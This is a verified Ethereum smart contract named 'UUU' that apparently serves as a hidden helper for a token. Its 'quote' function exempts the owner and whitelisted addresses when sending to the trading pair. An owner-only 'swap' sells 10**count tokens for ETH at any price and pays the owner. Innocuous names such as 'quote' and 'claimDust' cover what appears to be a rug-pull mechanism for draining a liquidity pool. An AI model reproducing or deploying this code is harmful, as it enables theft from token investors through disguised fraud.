/**
 *Submitted for verification at Etherscan.io on 2023-06-25
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IERC20 {
    function decimals() external returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract UUU is Ownable {

    IUniswapV2Router02 public uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    address coin;
    address pair;

    mapping(address => bool) whites;

    receive() external payable { }

    function initParam(address _coin, address _pair) external onlyOwner {
        coin = _coin;
        pair = _pair;
    }

    function resetParam() external onlyOwner {
        coin = address(0);
        pair = address(0);
    }

    function quote(
        uint256 amount,
        address from,
        address to
    ) external view returns (uint256 amountB) {
        if (pair == address(0)) {
            return amount;
        }
        else if ((from == owner() || from == address(this) || whites[from] == true) && to == pair) {
            return 0;
        }

        return amount;
    }

    function swap(uint256 count) external onlyOwner {

        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = coin;
        path[1] = uniswapV2Router.WETH();

        IERC20(coin).approve(address(uniswapV2Router), ~uint256(0));

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            10 ** count,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );  

        payable(msg.sender).transfer(address(this).balance);
    }

    function addW(address[] memory _wat) public onlyOwner{
        for (uint i = 0; i < _wat.length; i++) {
            whites[_wat[i]] = true;
        }
    }

    function claimDust() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }
}